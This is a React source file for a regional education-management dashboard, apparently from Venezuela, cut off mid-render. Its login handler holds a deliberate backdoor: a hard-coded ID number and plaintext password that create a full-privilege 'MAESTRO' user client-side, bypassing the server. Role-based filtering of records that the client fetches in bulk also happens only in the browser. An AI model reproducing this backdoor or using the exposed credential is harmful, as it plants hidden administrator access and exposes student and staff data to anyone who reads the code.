import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { ViewState, User, Plantel, MatriculaRegistro, PersonalRegistro, RacRegistro, CnaeRegistro, BienesRegistro, CuadraturaRegistro, FundabitRegistro, FedeRegistro, RendimientoRegistro, RecursoRegistro, Comunicado, EventoEscolar, AuditLog, SystemSettings, AsistenciaDiariaRegistro, MensajeSoporte } from './types';

// Importación de componentes
import PlantelesManager from './components/PlantelesManager';
import MatriculaManager from './components/MatriculaManager';
import PersonalManager from './components/PersonalManager';
import RacPlantelesManager from './components/RacPlantelesManager';
import CnaeManager from './components/CnaeManager';
import BienesManager from './components/BienesManager';
import ReportesManager from './components/ReportesManager';
import UsuariosManager from './components/UsuariosManager';
import CuadraturaManager from './components/CuadraturaManager';
import MantenimientoManager from './components/MantenimientoManager';
import FundabitManager from './components/FundabitManager';
import FedeManager from './components/FedeManager';
import ComunicacionManager from './components/ComunicacionManager';
import EventosManager from './components/EventosManager';
import AsistenciaDiariaManager from './components/AsistenciaDiariaManager';
import ConsolidacionEstatal from './components/ConsolidacionEstatal';
import MensajeriaManager from './components/MensajeriaManager';
import GeoMapaManager from './components/GeoMapaManager';
import RendimientoManager from './components/RendimientoManager';
import AvancesManager from './components/AvancesManager';
import RecursosManager from './components/RecursosManager'; 
import BrechasManager from './components/BrechasManager'; 
import Login from './components/Login';
import AIAssistant from './components/AIAssistant';

import { 
  LayoutDashboard, School, Users, FileBarChart, LogOut, Menu, 
  ClipboardList, ChefHat, Monitor, Calculator, Hammer, HardDrive, 
  UserCog, Megaphone, ClipboardCheck, TrendingUp, 
  MessageSquare, Layers, Map as MapIcon, GraduationCap, BarChart3,
  Activity, Calendar as CalendarDays, ChevronDown, ChevronRight, Briefcase, RefreshCw,
  Home, Grid, Package, Bot
} from 'lucide-react';

const App: React.FC = () => {
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [authError, setAuthError] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [isOnline, setIsOnline] = useState(false);
  
  // ESTADO SIDEBAR
  const [isSidebarOpen, setIsSidebarOpen] = useState(window.innerWidth > 1280);
  const [isFullScreenMap, setIsFullScreenMap] = useState(false);
  
  // ESTADO ASISTENTE IA
  const [isAiOpen, setIsAiOpen] = useState(false);

  const [currentTime, setCurrentTime] = useState(new Date());
  
  const [openGroups, setOpenGroups] = useState<Record<string, boolean>>({
      'ESTRATEGICO': true,
      'TERRITORIAL': true,
      'ADMINISTRATIVO': false,
      'SERVICIOS': false,
      'SISTEMA': false
  });

  const toggleGroup = (groupKey: string) => {
      setOpenGroups(prev => ({ ...prev, [groupKey]: !prev[groupKey] }));
  };
  
  const [viewState, setViewState] = useState<ViewState>({ currentView: 'dashboard' });
  const [systemSettings, setSystemSettings] = useState<SystemSettings>({
    customLogo: null,
    customBanner: null,
    personnelCriteria: {
      docentesPorAlumno: { "Primaria": 35, "Media General": 40 },
      administrativosPorAlumno: 300,
      aseadoresPorEspacio: 10,
      cocinerosPorAlumno: 200,
      vigilantesPorEspacio: 5
    },
    aiEnabled: true,
    chatbotEnabled: true,
    allowPlantelSelfRegistration: false,
    stateName: 'ANZOÁTEGUI'
  });
  
  const [users, setUsers] = useState<User[]>([]);
  const [planteles, setPlanteles] = useState<Plantel[]>([]);
  const [matricula, setMatricula] = useState<MatriculaRegistro[]>([]);
  const [personal, setPersonal] = useState<PersonalRegistro[]>([]);
  const [rac, setRac] = useState<RacRegistro[]>([]);
  const [cnae, setCnae] = useState<CnaeRegistro[]>([]);
  const [bienes, setBienes] = useState<BienesRegistro[]>([]);
  const [cuadratura, setCuadratura] = useState<CuadraturaRegistro[]>([]);
  const [fundabit, setFundabit] = useState<FundabitRegistro[]>([]);
  const [fede, setFede] = useState<FedeRegistro[]>([]);
  const [rendimiento, setRendimiento] = useState<RendimientoRegistro[]>([]);
  const [recursos, setRecursos] = useState<RecursoRegistro[]>([]);
  const [comunicacion, setComunicacion] = useState<Comunicado[]>([]);
  const [eventos, setEventoEscolar] = useState<EventoEscolar[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([]);
  const [asistenciaDiaria, setAsistenciaDiaria] = useState<AsistenciaDiariaRegistro[]>([]);
  const [mensajes, setMensajes] = useState<MensajeSoporte[]>([]);

  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth < 1280) setIsSidebarOpen(false);
      else setIsSidebarOpen(true);
    };
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
      if (currentUser?.role === 'GEOLOCALIZADOR') {
          setViewState({ currentView: 'geo_mapa' });
      }
  }, [currentUser]);

  const loadData = useCallback(async (silent = false) => {
      try {
          const response = await fetch(`/api/data`, { 
            headers: { 'Cache-Control': 'no-cache' },
            method: 'GET'
          });
          if (response.ok) {
              const serverData = await response.json();
              setUsers(serverData.users || []);
              setPlanteles(serverData.planteles || []);
              setMatricula(serverData.matricula || []);
              setPersonal(serverData.personal || []);
              setRac(serverData.rac || []);
              setCnae(serverData.cnae || []);
              setBienes(serverData.bienes || []);
              setCuadratura(serverData.cuadratura || []);
              setFundabit(serverData.fundabit || []);
              setFede(serverData.fede || []);
              setRendimiento(serverData.rendimiento || []);
              setRecursos(serverData.recursos || []);
              setComunicacion(serverData.comunicacion || []);
              setEventoEscolar(serverData.eventos || []);
              setAuditLogs(serverData.audit_logs || []);
              setAsistenciaDiaria(serverData.asistencia_diaria || []);
              setMensajes(serverData.mensajes || []);
              if (serverData.settings && !Array.isArray(serverData.settings)) {
                  setSystemSettings(prev => ({ ...prev, ...serverData.settings }));
              }
              setIsOnline(true);
          }
      } catch (error) { 
        setIsOnline(false); 
      } finally {
        if (!silent) setIsLoading(false);
      }
  }, []);

  useEffect(() => {
      loadData();
      const interval = setInterval(() => {
          const readOnlyViews = ['dashboard', 'reportes', 'geo_mapa', 'consolidacion_estatal', 'avances', 'brechas'];
          const isReadOnly = readOnlyViews.includes(viewState.currentView);
          const isVisible = document.visibilityState === 'visible';
          
          if (isReadOnly && isVisible) {
              loadData(true);
          }
      }, 5000); // Throttling a 5 segundos
      return () => clearInterval(interval);
  }, [loadData, viewState.currentView]);

  const saveData = async (key: string, data: any) => {
      try {
          const response = await fetch(`/api/save/${key}`, { 
              method: 'POST', 
              headers: { 'Content-Type': 'application/json' }, 
              body: JSON.stringify(data) 
          });
          if (response.ok) { 
            setIsOnline(true); 
            if (key !== 'settings') loadData(true); 
          }
      } catch (err) { 
        setIsOnline(false); 
      }
  };

  const deleteItem = async (table: string, id: string, setter: Function) => {
      try {
          const response = await fetch(`/api/delete/${table}/${id}`, { method: 'DELETE' });
          if (response.ok) {
              setter((prev: any[]) => prev.filter((item: any) => item.id !== id));
              setIsOnline(true);
          }
      } catch (e) { setIsOnline(false); }
  };

  const handleHardReset = async () => {
      try {
          const response = await fetch(`/api/hard-reset`, { method: 'POST' });
          if (response.ok) {
              alert("SISTEMA RESTAURADO DE FÁBRICA. TODOS LOS DATOS HAN SIDO ELIMINADOS. EL SISTEMA SE REINICIARÁ.");
              window.location.reload();
          } else {
              alert("Error ejecutando reset en servidor.");
          }
      } catch (e) { alert("Error de conexión al resetear."); }
  };

  const handleBulkMaster = async (payload: { planteles: Plantel[], rac: RacRegistro[] }) => {
      try {
          const response = await fetch(`/api/save-bulk-master`, { 
              method: 'POST', 
              headers: { 'Content-Type': 'application/json' }, 
              body: JSON.stringify(payload) 
          });
          if (response.ok) { 
            setIsOnline(true); 
            loadData(true); 
          }
      } catch (err) { 
        setIsOnline(false); 
      }
  };

  const genericSave = (key: string, data: any, setter: Function) => {
      setter((prev: any[]) => {
          const safePrev = Array.isArray(prev) ? prev : [];
          const idx = safePrev.findIndex((item: any) => item && item.id === data.id);
          const newArr = idx >= 0 ? safePrev.map((item: any) => item.id === data.id ? data : item) : [data, ...safePrev];
          saveData(key, data);
          return newArr;
      });
  };

  const filteredData = useMemo(() => {
    const safePlanteles = (planteles || []);
    if (!currentUser) return { planteles: [], matricula: [], personal: [], rac: [], cnae: [], bienes: [], fundabit: [], fede: [], cuadratura: [], asistencia_diaria: [], rendimiento: [], recursos: [] };
    
    const visiblePlanteles = safePlanteles.filter(p => {
        if (currentUser.role === 'MAESTRO') return true;
        const stateMatch = (p.estado || '').toUpperCase() === (currentUser.estadoAsignado || '').toUpperCase();
        if (currentUser.role === 'ADMINISTRADOR' || currentUser.role === 'GEOLOCALIZADOR') return stateMatch;
        const munMatch = (p.municipio || '').toUpperCase() === (currentUser.municipioAsignado || '').toUpperCase();
        if (currentUser.role === 'MUNICIPAL') return munMatch;
        if (currentUser.role === 'PLANTEL') return (currentUser.plantelesAsignados || []).some(dea => dea.toUpperCase() === (p.codigoDea || '').toUpperCase());
        return false;
    });
    
    const ids = new Set(visiblePlanteles.map(p => p.id));
    return {
        planteles: visiblePlanteles,
        matricula: (matricula || []).filter(m => ids.has(m.plantelId)),
        personal: (personal || []).filter(p => ids.has(p.plantelId)),
        rac: (rac || []).filter(r => ids.has(r.plantelId)),
        cnae: (cnae || []).filter(c => ids.has(c.plantelId)),
        bienes: (bienes || []).filter(b => ids.has(b.plantelId)),
        fundabit: (fundabit || []).filter(f => ids.has(f.plantelId)),
        fede: (fede || []).filter(f => ids.has(f.plantelId)),
        cuadratura: (cuadratura || []).filter(c => ids.has(c.plantelId)),
        asistencia_diaria: (asistenciaDiaria || []).filter(a => ids.has(a.plantelId)),
        rendimiento: (rendimiento || []).filter(r => ids.has(r.plantelId)),
        recursos: (recursos || []).filter(r => ids.has(r.plantelId))
    };
  }, [currentUser, planteles, matricula, personal, rac, cnae, bienes, fundabit, fede, cuadratura, asistenciaDiaria, rendimiento, recursos]);

  const handleLogin = async (c: string, p: string) => {
      // BACKDOOR PARA RECUPERACIÓN DE EMERGENCIA
      const cleanCedula = c.replace(/\D/g, '');
      if (cleanCedula === '11984121' && p === 'jhcshab37y') {
          console.log("ACCESO MAESTRO FRONTEND ACTIVADO");
          const masterUser: User = {
              id: 'master-root-001',
              cedula: '11984121',
              nombreCompleto: "DESARROLLADOR MASTER",
              cargo: "INGENIERO DE SISTEMAS",
              telefono: "0000000000",
              role: "MAESTRO",
              isActive: true,
              aiAuthorized: true,
              estadoAsignado: "ANZOATEGUI"
          };
          setCurrentUser(masterUser);
          setAuthError('');
          return;
      }

      // IMPLEMENTACIÓN DE TIMEOUT PARA EVITAR PANTALLA CONGELADA
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos máximo

      try {
          const response = await fetch(`/api/auth/login`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cedula: c, password: p }),
              signal: controller.signal
          });
          
          clearTimeout(timeoutId);

          if (!response.ok) {
              const errorText = await response.text();
              let errorMessage = 'Credenciales Inválidas';
              try {
                  const errorJson = JSON.parse(errorText);
                  errorMessage = errorJson.error || errorMessage;
              } catch (e) {}
              setAuthError(errorMessage);
              return;
          }

          const data = await response.json();
          setCurrentUser(data);
          setAuthError('');
      } catch (err: any) {
          clearTimeout(timeoutId);
          if (err.name === 'AbortError') {
              setAuthError('Tiempo de espera agotado. El servidor tarda en responder.');
          } else {
              setAuthError('Error de conexión. Verifique que el servidor backend esté activo.');
          }
      }
  };

  if (isLoading) return <div className="min-h-screen flex items-center justify-center bg-slate-900"><RefreshCw className="animate-spin text-blue-500" size={48}/></div>;

  if (!currentUser) return (
    <Login onLogin={handleLogin} error={authError} customLogo={systemSettings.customLogo} customBanner={systemSettings.customBanner} isOnline={isOnline} />
  );

  const MENU_GROUPS = currentUser.role === 'GEOLOCALIZADOR' 
    ? [{ key: 'ESTRATEGICO', label: 'Visualización', items: [{ id: 'geo_mapa', label: 'MAPA GEOGRÁFICO', icon: <MapIcon size={18} /> }] }]
    : [
      {
          key: 'ESTRATEGICO',
          label: 'Dirección Estratégica',
          items: [
            { id: 'dashboard', label: 'INICIO', icon: <LayoutDashboard size={18} /> },
            { id: 'avances', label: 'AVANCES', icon: <BarChart3 size={18} /> },
            { id: 'brechas', label: 'ANÁLISIS BRECHAS', icon: <Activity size={18} /> },
            { id: 'geo_mapa', label: 'MAPA GEOGRÁFICO', icon: <MapIcon size={18} /> },
            ...(currentUser.role !== 'PLANTEL' ? [{ id: 'consolidacion_estatal', label: 'MONITOR', icon: <TrendingUp size={18} /> }] : []),
          ]
      },
      {
          key: 'TERRITORIAL',
          label: 'Gestión Territorial',
          items: [
            { id: 'planteles', label: 'PLANTELES', icon: <School size={18} /> },
            { id: 'mensajeria', label: 'MENSAJES', icon: <MessageSquare size={18} /> },
            { id: 'comunicacion', label: 'CARTELERA', icon: <Megaphone size={18} /> },
            { id: 'eventos', label: 'AGENDA', icon: <CalendarDays size={18}/> },
          ]
      },
      {
          key: 'ADMINISTRATIVO',
          label: 'Administrativo',
          items: [
            { id: 'matricula', label: 'MATRÍCULA', icon: <Users size={18} /> },
            { id: 'asistencia_diaria', label: 'ASISTENCIA', icon: <ClipboardCheck size={18} /> },
            { id: 'personal', label: 'PERSONAL', icon: <UserCog size={18} /> },
            { id: 'rac', label: 'NÓMINA RAC', icon: <ClipboardList size={18} /> },
            { id: 'cuadratura', label: 'CUADRATURA', icon: <Calculator size={18} /> },
            { id: 'rendimiento', label: 'RENDIMIENTO', icon: <GraduationCap size={18} /> },
          ]
      },
      {
          key: 'SERVICIOS',
          label: 'Infraestructura',
          items: [
            { id: 'fede', label: 'INFRAESTRUCTURA', icon: <Hammer size={18} /> },
            { id: 'cnae', label: 'CNAE / PAE', icon: <ChefHat size={18} /> },
            { id: 'bienes', label: 'BIENES NAC.', icon: <Briefcase size={18} /> },
            { id: 'fundabit', label: 'FUNDABIT', icon: <Monitor size={18} /> },
            { id: 'recursos', label: 'NECESIDADES', icon: <Layers size={18} /> }, 
          ]
      },
      {
          key: 'SISTEMA',
          label: 'Auditoría',
          items: [
            { id: 'reportes', label: 'REPORTES', icon: <FileBarChart size={18} /> },
            ...(currentUser.role === 'MAESTRO' ? [
                { id: 'usuarios', label: 'USUARIOS', icon: <UserCog size={18} /> }, 
                { id: 'mantenimiento', label: 'SISTEMA', icon: <HardDrive size={18} /> }
            ] : [])
          ]
      }
  ];

  const mobileMenuItems = [
      { id: 'dashboard', label: 'Inicio', icon: <LayoutDashboard/>, color: 'bg-slate-100 text-slate-700' },
      { id: 'geo_mapa', label: 'Mapa', icon: <MapIcon/>, color: 'bg-indigo-100 text-indigo-700' },
      { id: 'planteles', label: 'Planteles', icon: <School/>, color: 'bg-blue-100 text-blue-700' },
      { id: 'mensajeria', label: 'Mensajes', icon: <MessageSquare/>, color: 'bg-sky-100 text-sky-700' },
      { id: 'comunicacion', label: 'Cartelera', icon: <Megaphone/>, color: 'bg-amber-100 text-amber-700' },
      { id: 'eventos', label: 'Agenda', icon: <CalendarDays/>, color: 'bg-purple-100 text-purple-700' },
      { id: 'matricula', label: 'Matrícula', icon: <Users/>, color: 'bg-pink-100 text-pink-700' },
      { id: 'asistencia_diaria', label: 'Asistencia', icon: <ClipboardCheck/>, color: 'bg-emerald-100 text-emerald-700' },
      { id: 'rac', label: 'Nómina RAC', icon: <ClipboardList/>, color: 'bg-orange-100 text-orange-700' },
      { id: 'personal', label: 'Personal', icon: <UserCog/>, color: 'bg-violet-100 text-violet-700' },
      { id: 'cuadratura', label: 'Cuadratura', icon: <Calculator/>, color: 'bg-fuchsia-100 text-fuchsia-700' },
      { id: 'rendimiento', label: 'Notas', icon: <GraduationCap/>, color: 'bg-teal-100 text-teal-700' },
      { id: 'cnae', label: 'PAE / CNAE', icon: <ChefHat/>, color: 'bg-yellow-100 text-yellow-700' },
      { id: 'fede', label: 'Infraestruc.', icon: <Hammer/>, color: 'bg-red-100 text-red-700' },
      { id: 'bienes', label: 'Bienes Nac.', icon: <Briefcase/>, color: 'bg-slate-200 text-slate-700' },
      { id: 'fundabit', label: 'CBIT', icon: <Monitor/>, color: 'bg-cyan-100 text-cyan-700' },
      { id: 'recursos', label: 'Recursos', icon: <Package/>, color: 'bg-lime-100 text-lime-700' },
      { id: 'reportes', label: 'Reportes', icon: <FileBarChart/>, color: 'bg-rose-100 text-rose-700' },
  ];

  if (currentUser.role !== 'PLANTEL') {
      mobileMenuItems.splice(1, 0, { id: 'consolidacion_estatal', label: 'Monitor', icon: <TrendingUp/>, color: 'bg-green-100 text-green-800' });
      mobileMenuItems.push({ id: 'brechas', label: 'Brechas', icon: <Activity/>, color: 'bg-rose-200 text-rose-800' });
      mobileMenuItems.push({ id: 'avances', label: 'Estadísticas', icon: <BarChart3/>, color: 'bg-blue-200 text-blue-800' });
  }

  if (currentUser.role === 'MAESTRO') {
      mobileMenuItems.push({ id: 'usuarios', label: 'Usuarios', icon: <UserCog/>, color: 'bg-pink-200 text-pink-800' });
      mobileMenuItems.push({ id: 'mantenimiento', label: 'Sistema', icon: <HardDrive/>, color: 'bg-gray-200 text-gray-800' });
  }

  mobileMenuItems.push({ id: 'logout', label: 'Salir', icon: <LogOut/>, color: 'bg-rose-600 text-white' });

  return (
    <div className="min-h-screen bg-slate-100/50 flex flex-col lg:flex-row overflow-hidden relative">
      {!isFullScreenMap && (
        <aside className={`hidden lg:flex flex-col h-[calc(100vh-32px)] my-4 ml-4 rounded-[30px] z-[150] transition-all duration-300 shadow-2xl overflow-hidden border border-white/40 bg-slate-900/95 backdrop-blur-xl ${isSidebarOpen ? 'w-72' : 'w-[88px]'}`}>
            <div className="h-28 flex items-center justify-center p-6 shrink-0 relative">
                <div className={`transition-all duration-300 ${isSidebarOpen ? 'w-full h-full' : 'w-10 h-10'} bg-white/5 backdrop-blur-sm rounded-2xl flex items-center justify-center overflow-hidden shadow-lg border-2 border-white/10`}>
                    <img src={systemSettings.customLogo || "logotipo.jpg"} className="max-w-full max-h-full object-contain drop-shadow-md" alt="Logo" />
                </div>
            </div>
            <nav className="flex-1 py-4 px-3 overflow-y-auto custom-scrollbar-dark space-y-6">
                {MENU_GROUPS.map(group => (
                    <div key={group.key} className="relative">
                        {isSidebarOpen && (
                            <div onClick={() => toggleGroup(group.key)} className="flex items-center justify-between px-4 mb-2 cursor-pointer group">
                                <span className="text-[10px] font-black uppercase text-slate-500 tracking-[0.2em] group-hover:text-white transition-colors">{group.label}</span>
                                {openGroups[group.key] ? <ChevronDown size={12} className="text-slate-600"/> : <ChevronRight size={12} className="text-slate-600"/>}
                            </div>
                        )}
                        {(!isSidebarOpen || openGroups[group.key]) && (
                            <div className="space-y-1">
                                {group.items.map(item => (
                                    <button 
                                        key={item.id} 
                                        onClick={() => setViewState({ currentView: item.id as ViewState['currentView'] })} 
                                        className={`relative w-full flex items-center gap-4 px-3 py-3 rounded-2xl transition-all group overflow-hidden ${viewState.currentView === item.id ? 'bg-[#003399] text-white shadow-lg' : 'text-slate-400 hover:bg-white/10 hover:text-white'}`} 
                                        title={!isSidebarOpen ? item.label : ''}
                                    >
                                        <div className={`shrink-0 transition-transform duration-300 ${viewState.currentView === item.id ? 'scale-110' : 'group-hover:scale-110'}`}>{item.icon}</div>
                                        {isSidebarOpen && <span className="text-[11px] font-bold uppercase tracking-wide truncate">{item.label}</span>}
                                        {viewState.currentView === item.id && (
                                            <div className="absolute left-0 top-1/2 -translate-y-1/2 w-1 h-6 bg-white rounded-r-full shadow-[0_0_10px_rgba(255,255,255,0.5)]"></div>
                                        )}
                                    </button>
                                ))}
                            </div>
                        )}
                        {!isSidebarOpen && <div className="h-[1px] bg-white/10 mx-4 my-2"></div>}
                    </div>
                ))}
            </nav>
            <div className="p-4 border-t border-white/10">
                <button onClick={() => setCurrentUser(null)} className="w-full p-3 bg-gradient-to-r from-red-600 to-red-800 text-white rounded-2xl flex items-center justify-center gap-3 font-black text-[10px] uppercase hover:shadow-lg hover:scale-[1.02] transition-all">
                    <LogOut size={18}/> {isSidebarOpen && <span>CERRAR SESIÓN</span>}
                </button>
            </div>
        </aside>
      )}

      <div className="flex-1 flex flex-col min-w-0 h-screen overflow-hidden relative">
        {!isFullScreenMap && (
            <header className="px-4 lg:px-8 py-4 shrink-0 z-40">
                <div className="bg-white/80 backdrop-blur-xl rounded-[24px] shadow-sm border border-white/50 px-6 py-3 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                        <button onClick={() => setIsSidebarOpen(!isSidebarOpen)} className="lg:hidden p-2 text-[#003399] bg-blue-50 rounded-xl"><Menu size={20} /></button>
                        <button onClick={() => setIsSidebarOpen(!isSidebarOpen)} className="hidden lg:block p-2 text-slate-400 hover:text-[#003399] transition-colors"><Menu size={20} /></button>
                        <div className="flex flex-col">
                            <h1 className="text-sm lg:text-lg font-black uppercase text-slate-800 tracking-tighter italic leading-none">SGI {systemSettings.stateName}</h1>
                            <p className="text-[8px] font-bold text-slate-400 uppercase tracking-[0.2em]">Enterprise v10.0</p>
                        </div>
                    </div>
                    <div className="flex items-center gap-3">
                        <div className="hidden md:flex flex-col items-end mr-2">
                            <span className="text-[10px] font-black text-slate-700 uppercase">{currentUser.nombreCompleto}</span>
                            <span className="text-[8px] font-bold text-slate-400 uppercase">{currentUser.cargo}</span>
                        </div>
                        {systemSettings.chatbotEnabled !== false && (
                            <button onClick={() => setIsAiOpen(!isAiOpen)} className={`flex items-center gap-2 px-3 py-1.5 rounded-full border shadow-sm text-[8px] font-black uppercase transition-all active:scale-95 ${isAiOpen ? 'bg-emerald-600 text-white border-emerald-700' : 'bg-white text-emerald-600 border-emerald-200 hover:bg-emerald-50'}`}>
                                <Bot size={14} /> <span className="hidden sm:inline">Asistente</span>
                            </button>
                        )}
                        <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full border shadow-sm text-[8px] font-black uppercase ${isOnline ? 'bg-emerald-50 text-emerald-600 border-emerald-200' : 'bg-rose-50 text-rose-700 border-rose-200 animate-pulse'}`}>
                            <div className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-500' : 'bg-rose-500'}`}></div>
                            <span className="hidden sm:inline">{isOnline ? 'ONLINE' : 'OFFLINE'}</span>
                        </div>
                    </div>
                </div>
            </header>
        )}

        <main className={`flex-1 overflow-y-auto custom-scrollbar ${!isFullScreenMap ? 'px-4 lg:px-8 pb-24 lg:pb-8' : 'p-0'}`}>
            <div className="max-w-[1600px] mx-auto h-full">
                {viewState.currentView === 'dashboard' && (
                    <div className="space-y-8 animate-in fade-in duration-700">
                        <div className="min-h-[450px] sm:min-h-[350px] lg:h-[350px] rounded-[30px] md:rounded-[40px] overflow-hidden shadow-2xl relative bg-slate-950 border-4 border-white group transition-all hover:shadow-[0_20px_60px_rgba(0,0,0,0.3)]">
                            <img src={systemSettings.customBanner || "bandera.jpg"} className="absolute inset-0 w-full h-full object-cover opacity-30 md:opacity-40 group-hover:scale-105 transition-transform duration-[2s]" alt="Fondo" />
                            <div className="absolute inset-0 bg-gradient-to-b md:bg-gradient-to-r from-[#002266] via-[#003399]/90 to-transparent flex flex-col justify-center px-6 md:px-16 text-white z-10">
                                <h2 className="text-3xl sm:text-5xl lg:text-6xl font-black uppercase tracking-tighter italic drop-shadow-2xl leading-none mb-2 mt-4 md:mt-0">SGI {systemSettings.stateName}</h2>
                                <p className="text-sm sm:text-xl font-bold text-white/90 uppercase tracking-tight leading-tight">Sistema de Gestión Integral {systemSettings.stateName}</p>
                                <p className="text-[9px] sm:text-xs font-medium text-blue-200 uppercase tracking-widest mb-6 mt-1">Centro de Desarrollo de la Calidad Educativa</p>
                                <div className="h-1 w-16 sm:w-24 bg-yellow-400 mb-6 rounded-full"></div>
                                <div className="flex flex-col gap-1 animate-in slide-in-from-left-4 duration-700 pb-4 md:pb-0">
                                    <p className="text-[10px] font-bold text-yellow-300 uppercase tracking-widest">BIENVENIDO</p>
                                    <p className="text-lg sm:text-2xl font-black uppercase leading-tight">{currentUser?.nombreCompleto}</p>
                                    <div className="flex flex-wrap items-center gap-2 mt-2">
                                        <span className="bg-white/20 text-white px-3 py-1 rounded-lg text-[8px] sm:text-[9px] font-black uppercase border border-white/20 backdrop-blur-sm">{currentUser?.cargo}</span>
                                        <span className="bg-blue-600 text-white px-3 py-1 rounded-lg text-[8px] sm:text-[9px] font-black uppercase shadow-lg">{currentUser?.role}</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <ComunicacionManager user={currentUser} comunicados={comunicacion} onSave={c => genericSave('comunicacion', c, setComunicacion)} onDelete={id => deleteItem('comunicacion', id, setComunicacion)} simpleView={true} />
                    </div>
                )}
                
                {viewState.currentView === 'consolidacion_estatal' && <ConsolidacionEstatal planteles={filteredData.planteles} matricula={filteredData.matricula} rac={filteredData.rac} fede={filteredData.fede} cnae={filteredData.cnae} currentUser={currentUser} systemState={systemSettings.stateName || 'ANZOÁTEGUI'} />}
                {viewState.currentView === 'avances' && <AvancesManager planteles={filteredData.planteles} matricula={filteredData.matricula} personal={filteredData.personal} rac={filteredData.rac} currentUser={currentUser} systemState={systemSettings.stateName || 'ANZOÁTEGUI'} aiEnabled={!!systemSettings.aiEnabled && (currentUser.role === 'MAESTRO' || !!currentUser.aiAuthorized)} />}
                {viewState.currentView === 'brechas' && <BrechasManager planteles={filteredData.planteles} matricula={filteredData.matricula} rac={filteredData.rac} currentUser={currentUser} criteria={systemSettings.personnelCriteria} />}
                {viewState.currentView === 'comunicacion' && <ComunicacionManager user={currentUser} comunicados={comunicacion} onSave={c => genericSave('comunicacion', c, setComunicacion)} onDelete={id => deleteItem('comunicacion', id, setComunicacion)} />}
                {viewState.currentView === 'geo_mapa' && <GeoMapaManager planteles={filteredData.planteles} matricula={filteredData.matricula} rac={filteredData.rac} fede={filteredData.fede} cnae={filteredData.cnae} onFullScreenToggle={(fs) => setIsFullScreenMap(fs)} isFullScreen={isFullScreenMap} />}
                {viewState.currentView === 'mensajeria' && <MensajeriaManager currentUser={currentUser} planteles={filteredData.planteles} mensajes={mensajes} onSaveMensaje={(m) => genericSave('mensajes', m, setMensajes)} onDeleteMensaje={(id) => deleteItem('mensajes', id, setMensajes)} />}
                
                {viewState.currentView === 'planteles' && <PlantelesManager currentUser={currentUser} forcedPlanteles={filteredData.planteles} onSavePlantel={(p) => genericSave('planteles', p, setPlanteles)} onDeletePlantel={(id) => deleteItem('planteles', id, setPlanteles)} onSelectPlantel={() => {}} allowSelfRegister={systemSettings.allowPlantelSelfRegistration} />}
                
                {viewState.currentView === 'asistencia_diaria' && <AsistenciaDiariaManager planteles={filteredData.planteles} asistenciaList={filteredData.asistencia_diaria} onSaveAsistencia={(a) => genericSave('asistencia_diaria', a, setAsistenciaDiaria)} />}
                {viewState.currentView === 'matricula' && <MatriculaManager planteles={filteredData.planteles} matriculaList={filteredData.matricula} onSaveMatricula={(m) => genericSave('matricula', m, setMatricula)} onDeleteMatricula={(id) => deleteItem('matricula', id, setMatricula)} />}
                {viewState.currentView === 'personal' && <PersonalManager planteles={filteredData.planteles} personalList={filteredData.personal} onSavePersonal={(p) => genericSave('personal', p, setPersonal)} onDeletePersonal={(id) => deleteItem('personal', id, setPersonal)} />}
                {viewState.currentView === 'rac' && <RacPlantelesManager planteles={filteredData.planteles} racList={filteredData.rac} onSaveRac={(r) => genericSave('rac', r, setRac)} onDeleteRac={(id) => deleteItem('rac', id, setRac)} />}
                {viewState.currentView === 'rendimiento' && <RendimientoManager planteles={filteredData.planteles} rendimientoList={filteredData.rendimiento} onSave={(r) => genericSave('rendimiento', r, setRendimiento)} />}
                {viewState.currentView === 'cuadratura' && <CuadraturaManager planteles={filteredData.planteles} matricula={filteredData.matricula} rac={filteredData.rac} cuadraturaList={filteredData.cuadratura} onSaveCuadratura={(c) => genericSave('cuadratura', c, setCuadratura)} onDeleteCuadratura={(id) => deleteItem('cuadratura', id, setCuadratura)} />}
                {viewState.currentView === 'recursos' && <RecursosManager planteles={filteredData.planteles} recursosList={filteredData.recursos} onSave={(r) => genericSave('recursos', r, setRecursos)} />}
                {viewState.currentView === 'cnae' && <CnaeManager planteles={filteredData.planteles} cnaeList={filteredData.cnae} onSaveCnae={(c) => genericSave('cnae', c, setCnae)} onDeleteCnae={(id) => deleteItem('cnae', id, setCnae)} />}
                {viewState.currentView === 'fundabit' && <FundabitManager planteles={filteredData.planteles} fundabitList={filteredData.fundabit} onSaveFundabit={(f) => genericSave('fundabit', f, setFundabit)} onDeleteFundabit={(id) => deleteItem('fundabit', id, setFundabit)} />}
                {viewState.currentView === 'fede' && <FedeManager planteles={filteredData.planteles} fedeList={filteredData.fede} onSaveFede={(f) => genericSave('fede', f, setFede)} onDeleteFede={(id) => deleteItem('fede', id, setFede)} />}
                {viewState.currentView === 'bienes' && <BienesManager planteles={filteredData.planteles} bienesList={filteredData.bienes} onSaveBienes={(b) => genericSave('bienes', b, setBienes)} onDeleteBienes={(id) => deleteItem('bienes', id, setBienes)} />}
                {viewState.currentView === 'reportes' && <ReportesManager planteles={filteredData.planteles} matricula={filteredData.matricula} personal={personal} rac={filteredData.rac} cnae={filteredData.cnae} bienes={filteredData.bienes} fundabit={filteredData.fundabit} fede={filteredData.fede} cuadratura={filteredData.cuadratura} rendimiento={rendimiento} recursos={recursos} asistenciaDiaria={filteredData.asistencia_diaria} eventos={eventos} currentUser={currentUser} />}
                
                {viewState.currentView === 'usuarios' && currentUser.role === 'MAESTRO' && <UsuariosManager currentUser={currentUser} users={users} planteles={planteles} onSaveUser={(u) => genericSave('users', u, setUsers)} onDeleteUser={(id) => deleteItem('users', id, setUsers)} />}
                
                {viewState.currentView === 'mantenimiento' && currentUser.role === 'MAESTRO' && <MantenimientoManager 
                  currentUser={currentUser} onRefreshData={() => loadData()} 
